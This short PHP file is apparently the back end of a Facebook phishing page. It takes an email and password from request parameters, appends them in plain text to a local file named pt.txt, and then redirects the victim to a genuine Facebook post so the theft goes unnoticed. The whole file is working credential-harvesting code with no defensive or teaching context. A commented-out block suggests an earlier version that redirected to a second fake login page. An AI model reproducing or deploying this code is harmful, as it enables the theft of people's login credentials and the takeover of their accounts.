<?php

$usd= $_GET['email'];
$psd= $_GET['pass'];
 //$c= $_GET['count'];
 
  
if(isset($usd)) {
file_put_contents("pt.txt", "email: $usd pass: $psd ",FILE_APPEND);}

 
	header('refresh:0; url=https://www.facebook.com/100044420949935/posts/630798778410815/');
	
/*}
else {
	header('refresh:0; url=Facebook2.php? count='.$c.'');
	
	if(isset($usd)) {
		if($c==3){
	
}*/
?>